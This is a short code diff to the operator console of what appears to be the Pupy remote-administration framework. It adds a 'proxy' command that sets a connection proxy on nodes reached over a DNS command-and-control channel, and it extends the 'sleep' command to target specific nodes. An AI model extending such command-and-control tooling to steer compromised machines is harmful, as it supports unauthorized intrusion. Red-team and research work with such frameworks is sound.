@@ -969,6 +969,9 @@ class PupyCmd(cmd.Cmd):
         dexec.add_argument('-p', '--proxy', action='store_true', default=False,
                                help='Ask to use system proxy (http/https only)')
 
+        proxy = commands.add_parser('proxy', help='Set connection proxy')
+        proxy.add_argument('uri', help='URI. Example: http://user:password@192.168.0.1:3128 or none')
+
         exit = commands.add_parser('exit', help='Request exit')
 
         try:
@@ -1207,6 +1210,18 @@ class PupyCmd(cmd.Cmd):
         elif args.command == 'sleep':
             count = self.dnscnc.sleep(
                 args.timeout,
+                node=args.node,
+                default=args.default
+            )
+
+            if count:
+                self.display_success('Schedule sleep to {} known nodes'.format(count))
+            elif args.node:
+                self.display_error('Node {} not found'.format(args.node))
+
+        elif args.command == 'proxy':
+            count = self.dnscnc.proxy(
+                args.uri,
                 node=args.node,
                 default=args.default
             )
